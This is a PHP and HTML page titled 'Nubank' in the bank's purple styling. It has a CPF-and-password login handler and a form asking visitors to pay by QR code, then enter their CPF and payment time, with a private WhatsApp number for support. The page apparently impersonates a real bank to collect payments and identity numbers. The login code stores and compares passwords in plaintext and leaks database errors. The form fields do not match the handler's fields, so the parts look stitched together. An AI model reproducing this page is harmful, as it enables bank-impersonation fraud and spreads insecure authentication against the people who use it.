<?php
include('conexao.php');

if(isset($_POST['cuser']) || isset($_POST['csenha'])) {

    if(strlen($_POST['cuser']) == 0) {
        echo "";
		    echo "<table width='100%' border='0'>";
 			echo "<tr>";
			echo "<th height='83' bgcolor='#FFFFFF' scope='col'>";
			echo "<img src='imagens/cardfogete.gif' width='150'><center><br>Preencha seu CPF<center>";
			echo "<th/><tr/>";
  			echo "</table>";

		
		
    } else if(strlen($_POST['csenha']) == 0) {
        echo "<table width='100%' border='0'>";
 			echo "<tr>";
			echo "<th height='83' bgcolor='#FFFFFF' scope='col'>";
			echo "<img src='imagens/cardequilibio.gif' width='150'>";
			echo "<center><br>Preencha sua SENHA<center>";
			echo "<th/><tr/>";
  			echo "</table>";
    } else {

        $usuario = $mysqli->real_escape_string($_POST['cuser']);
        $senha = $mysqli->real_escape_string($_POST['csenha']);
		
		$CRITERIO = 'ON';
        $sql_code = "SELECT * FROM usuarios WHERE cpf = '$usuario' AND senha = '$senha' and status = '$CRITERIO'";
        $sql_query = $mysqli->query($sql_code) or die("Falha na execução do código SQL: " . $mysqli->error);

        $quantidade = $sql_query->num_rows;

        if($quantidade == 1) {
            
            $usuario = $sql_query->fetch_assoc();

            if(!isset($_SESSION)) {
                session_start();
            }

            $_SESSION['id'] = $usuario['id_cod'];
            $_SESSION['cpf'] = $usuario['cpf'];
            $_SESSION['nome'] = $usuario['nome'];
            $_SESSION['sobrenome'] = $usuario['sobrenome'];
            $_SESSION['instituicao'] = $usuario['instituicao'];
            $_SESSION['agencia'] = $usuario['agencia'];
            $_SESSION['conta'] = $usuario['conta'];
            $_SESSION['tipodeconta'] = $usuario['tipodeconta'];
            $_SESSION['saldo'] = $usuario['saldo'];

            header("Location: painel2.php");

        } else {
            echo "<table width='100%' border='0'>";
 			echo "<tr>";
			echo "<th height='83' bgcolor='#FFFFFF' scope='col'>";
			echo "<img src='imagens/cardporco.gif' width='150'>";
			echo "<center><br>Falha ao logar!<br>CPF ou Senha incorretos!<center>";
				echo "<th/><tr/>";
  			echo "</table>";

        }

    }

}
?>
<!DOCTYPE html>
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="imagens/icone.png" />
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Nubank</title>
<link rel="stylesheet" href="estilonu.css">

<!-- Place your kit's code here -->
            <script src="https://kit.fontawesome.com/5b81a21603.js" crossorigin="anonymous"></script>
<script language="javascript" type="text/javascript">
            function keyEnterPressed(e, document){
                if(e.keyCode=='13')
                {
                    document.focus();
                }
            }
        </script>

<style type="text/css">
.bordadestaque {
	border: 2px solid #0069FE;
	font-family: Verdana, Geneva, sans-serif;
	font-size: 19px;
	padding: 12px;
	background-color: #FFFFFF;
	border-radius: 5px;
}


A {
	text-decoration: none;
	font-size: 14px;
} 

txt centro {
	text-align: center;
}
#form1 p #cusuario {
	text-align: center;
}
.bordalogin {
	border: 1px solid #820AD1;
	font-family: Verdana, Geneva, sans-serif;
	font-size: 16px;
	padding: 12px;
	background-color: #FFFFFF;
	border-radius: 5px;
}
.campotexto {
	font-family: "Graphik Regular";
	font-size: 26px;
	padding: 16px;
	background-color: #FFFFFF;
	border-radius: 5px;
	border-top-width: 1px;
	border-right-width: 1px;
	border-bottom-width: 1px;
	border-left-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	text-align: center;	
}
.campodata {
	font-family: "Graphik Regular";
	font-size: 26px;
	padding: 16px;
	background-color: #FFFFFF;
	border-radius: 5px;
	border-top-width: 1px;
	border-right-width: 1px;
	border-bottom-width: 1px;
	border-left-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	text-align: center;
}
.botaoentrar {
	font-size: 18px;
	background-color: #820AD1;
	width: 220px; /* Ajuste a largura conforme necessário */
	height: 44px; /* Ajuste a altura conforme necessário */
	color: #FFF;
	border-radius: 45px;
	font-style: normal;
	line-height: normal;
	background-position: center center;
	font-weight: normal;
	margin: 0px;
	border: 10px double #820AD1;
	text-align: center;
	font-family: "Graphik Medium";
}
.botaocadastro {
	font-size: 18px;
	background-color: #FFFFFF;
	width: 180px; /* Ajuste a altura conforme necessário */
	color: #820AD1;
	border-radius: 45px;
	font-style: normal;
	line-height: normal;
	background-position: center center;
	font-weight: normal;
	margin: 0px;
	border: 1px solid #820AD1;
	text-align: center;
	height: 30px;
}
body,td,th {
	font-family: Verdana, Geneva, sans-serif;
}
body {
	background: url(<?php echo $selectedBg; ?>);
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-attachment: fixed;
	background-repeat: no-repeat;
	background-scale: 100%;
	background-size: contain;
	background-size: cover;
	text-align: center;
}
.contorno {
	background-color: #FFF;
	width: 390px;
	display: table;
	height: 350px;
	border-radius: 15px;
	opacity: 0.9;
}
.bordaentrada {
	border: 1px solid #CCC;
	border-radius: 30px;
}
</style>
</head>

<body text="#666666" link="#666666" vlink="#333333" alink="black">
<br>
<table width="100%" border="0">
  <tr>
    <td height="50" align="center"><table width="90%" border="0">
      <tr>
        <td><a href="login.php"><img src="imagens/x.png" alt="" width="24"></a></td>
        <td align="right">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
<form action=""  method="POST" ><center>
  <div class="contorno">
    <table width="300"  border="0" align="center" class="bordaentrada">
      <tr>
        <td height="20" align="center" valign="middle" scope="col">&nbsp;</td>
      </tr>
      <tr>
        <td height="70" align="center" valign="middle" scope="col"><table width="90%" border="0">
          <tr>
            <td align="center">1 - Efetue o pagamento pelo QR CODE!</td>
          </tr>
          <tr>
            <td align="center"><p><img src="imagens/qrcode.png">                <br>
            </p></td>
          </tr>
          <tr>
            <td align="center">2 - Informe o CPF cadastrado na plataforma! </td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td height="70" align="center" valign="middle" scope="col"><input name="cpf" type="text" class="campotexto" id="csenha3" style="outline: none;" value="CPF" size="13" maxlength="11" oninput="this.value = this.value.replace(/\D/g, '')" inputmode="numeric" />
          
          
          
          
          </td>
      </tr>
      <tr>
        <td height="50" align="center" valign="bottom"><table width="90%" border="0">
          <tr>
            <td align="center">3 - Informe  <strong>HORA</strong> e <strong>MINUTO</strong> do pagamento conforme seu comprovante.</td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td height="50" align="center" valign="bottom"><label for="hora"></label>
          <label for="select"></label>
          <span class="campodata">
          <select name="hora" size="1" class="campodata" id="hora">
            <option value="01">01</option>
            <option value="02">02</option>
            <option value="03">03</option>
            <option value="04">04</option>
            <option value="05">05</option>
            <option value="06">06</option>
            <option value="07">07</option>
            <option value="08">08</option>
            <option value="09">09</option>
            <option value="10">10</option>
            <option value="11">11</option>
            <option value="12">12</option>
            <option value="13">13</option>
            <option value="14">14</option>
            <option value="15">15</option>
            <option value="16">16</option>
            <option value="17">17</option>
            <option value="18">18</option>
            <option value="19">19</option>
            <option value="20">20</option>
            <option value="21">21</option>
            <option value="22">22</option>
            <option value="23">23</option>
            <option value="00">00</option>
    </select>
          <select name="dias" class="campodata">
  <?php
  for ($i = 1; $i <= 60; $i++) {
    $value = sprintf('%02d', $i); // Adiciona um zero antes dos números de 1 a 9
    echo '<option value="' . $value . '">' . $value . '</option>';
  }
  ?>
</select>
</span></td>
      </tr>
      <tr>
    <td width="450" height="50" align="center" valign="bottom">
      <input name="button" type="submit" class="botaoentrar" id="button" value="Confirmar" >        </td>
</tr>
  <tr>
    <td height="40" align="center" valign="middle"><a href="#" class="icon3" style="font-size: 18px; color: #666;"></a></td>
  </tr>
  </table>
    <br>
    <table width="100%" border="0">
  <tr>
    <td height="70" align="center"><a href="#" class="icon2" style="font-size: 17px; color: #666;"><br>
      </a><a href="https://wa.me/98981449650" class="icon2" style="font-size: 17px; color: #666;">Suporte WhatsApp</a><br>
      <br>
      <br></td>
  </tr>
    </table>
     </div></center>
</form>
</body>
</html>